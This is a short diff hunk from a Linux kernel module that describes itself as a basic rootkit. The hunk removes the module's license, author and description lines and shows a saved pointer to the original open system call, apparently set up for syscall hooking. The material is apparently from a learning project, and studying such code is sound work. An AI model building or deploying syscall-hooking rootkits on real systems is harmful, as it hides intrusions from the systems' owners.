@@ -8,12 +8,6 @@
 #include <linux/unistd.h>
 #include <linux/string.h>
 
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Richard Kavanagh <richard.kavanagh7@mail.dcu.ie>");
-MODULE_DESCRIPTION("A basic rootkit.");
-
-
 /* Old stystem call function prototype. */
 asmlinkage int (*original_open)(const char *pathname, int flags);
 
